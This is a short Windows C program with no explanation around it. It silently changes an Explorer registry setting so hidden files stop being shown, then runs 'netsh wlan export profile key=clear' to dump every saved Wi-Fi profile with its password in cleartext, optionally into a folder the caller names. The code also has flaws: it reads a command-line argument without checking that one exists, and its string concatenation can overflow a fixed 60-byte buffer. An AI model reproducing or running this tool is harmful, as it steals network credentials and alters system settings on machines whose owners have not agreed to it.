#include <windows.h>
#include <string.h>

void main(int argc, char **argv){
	WinExec("cmd.exe /c reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Hidden /t REG_DWORD /d 2 /f", 0);
	if(!strcmp(argv[1], "-f")){
		char str[60] = "cmd.exe /c netsh wlan export profile folder=";
		strcat(str, strcat(argv[2], " key=clear"));
		WinExec(str, 0);  
	} else {
		WinExec("cmd.exe /c netsh wlan export profile key=clear", 0);
	}    
}
